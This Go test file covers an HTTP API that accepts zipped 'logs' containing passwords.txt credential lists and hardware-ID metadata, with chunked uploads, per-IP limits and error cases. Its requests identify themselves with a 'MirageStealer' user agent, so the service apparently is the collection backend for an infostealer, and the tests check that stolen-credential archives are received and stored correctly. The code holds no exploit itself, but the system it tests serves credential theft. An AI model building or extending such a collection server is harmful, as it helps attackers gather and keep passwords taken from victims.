package api_test

import (
	"bytes"
	"encoding/json"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strconv"
	"testing"
)

// chunkRequest posts one chunk part for the given session/index/IP.
func chunkRequest(t *testing.T, r http.Handler, apiKey, sessionID, index string, data []byte, ip string) *httptest.ResponseRecorder {
	t.Helper()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("data", "chunk")
	fw.Write(data)
	mw.WriteField("session_id", sessionID)
	mw.WriteField("chunk_index", index)
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log/chunk", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	if ip != "" {
		req.Header.Set("X-Forwarded-For", ip)
	}
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	return w
}

func TestLogIngest_UA_Metadata(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("archive", "logs.zip")
	fw.Write(createTestZip(t, map[string]string{
		"passwords.txt": "https://example.com\tuser\tpass",
	}))
	mw.WriteField("metadata", `{"hwid":"hw-ua","os":"win10"}`)
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("User-Agent", "MirageStealer/1.0")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestLogIngest_UA_NoMetadata(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("archive", "logs.zip")
	fw.Write(createTestZip(t, map[string]string{
		"passwords.txt": "https://example.com\tuser\tpass",
	}))
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("User-Agent", "MirageStealer/2.0")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestLogIngest_InvalidForm(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodPost, "/api/log", bytes.NewBufferString(`{}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestLogIngest_GarbageArchive(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("archive", "logs.zip")
	fw.Write([]byte("this is not a zip file"))
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d: %s", w.Code, w.Body.String())
	}
}

func TestChunk_InvalidForm(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodPost, "/api/log/chunk", bytes.NewBufferString(`{}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestChunk_MissingDataFile(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	mw.WriteField("session_id", "chunk-nodata")
	mw.WriteField("chunk_index", "0")
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log/chunk", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("X-Forwarded-For", "203.0.113.90")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestChunk_TooManySessionsPerIP(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	ip := "203.0.113.201"
	for i := range 10 {
		w := chunkRequest(t, r, apiKey, "ip-limit-"+strconv.Itoa(i), "0", []byte("data"), ip)
		if w.Code != http.StatusOK {
			t.Fatalf("chunk %d: expected 200, got %d: %s", i, w.Code, w.Body.String())
		}
	}

	w := chunkRequest(t, r, apiKey, "ip-limit-over", "0", []byte("data"), ip)
	if w.Code != http.StatusTooManyRequests {
		t.Fatalf("expected 429, got %d: %s", w.Code, w.Body.String())
	}
}

func TestChunk_TooManyChunks(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	w := chunkRequest(t, r, apiKey, "chunk-overflow", "1024", []byte("data"), "203.0.113.202")
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCompleteChunked_MissingFields(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", bytes.NewBufferString("session_id=x"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCompleteChunked_InvalidTotal(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", bytes.NewBufferString("session_id=x&total_chunks=0"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCompleteChunked_NoChunks(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", bytes.NewBufferString("session_id=nonexistent&total_chunks=1"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCompleteChunked_CountMismatch(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	ip := "203.0.113.203"
	if w := chunkRequest(t, r, apiKey, "mismatch-sess", "0", []byte("data"), ip); w.Code != http.StatusOK {
		t.Fatalf("chunk upload failed: %d", w.Code)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", bytes.NewBufferString("session_id=mismatch-sess&total_chunks=2"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCompleteChunked_MissingChunk(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	ip := "203.0.113.204"
	// Upload only chunk index 1; declare total 1 → chunk 0 missing.
	if w := chunkRequest(t, r, apiKey, "gap-sess", "1", []byte("data"), ip); w.Code != http.StatusOK {
		t.Fatalf("chunk upload failed: %d", w.Code)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", bytes.NewBufferString("session_id=gap-sess&total_chunks=1"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCompleteChunked_SuccessWithUA(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	ip := "203.0.113.205"
	sessionID := "complete-ua"
	zipData := createTestZip(t, map[string]string{
		"passwords.txt": "https://example.com\tuser\tpass",
	})
	if w := chunkRequest(t, r, apiKey, sessionID, "0", zipData, ip); w.Code != http.StatusOK {
		t.Fatalf("chunk upload failed: %d", w.Code)
	}

	form := "session_id=" + sessionID + "&total_chunks=1&metadata=" + "%7B%22hwid%22%3A%22hw-complete%22%7D"
	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", bytes.NewBufferString(form))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("User-Agent", "MirageStealer/3.0")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["session_id"] == "" {
		t.Error("expected session_id")
	}
}

func TestCompleteChunked_GarbageArchive(t *testing.T) {
	d := openTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	ip := "203.0.113.206"
	sessionID := "complete-garbage"
	if w := chunkRequest(t, r, apiKey, sessionID, "0", []byte("not a zip"), ip); w.Code != http.StatusOK {
		t.Fatalf("chunk upload failed: %d", w.Code)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", bytes.NewBufferString("session_id="+sessionID+"&total_chunks=1"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d: %s", w.Code, w.Body.String())
	}
}
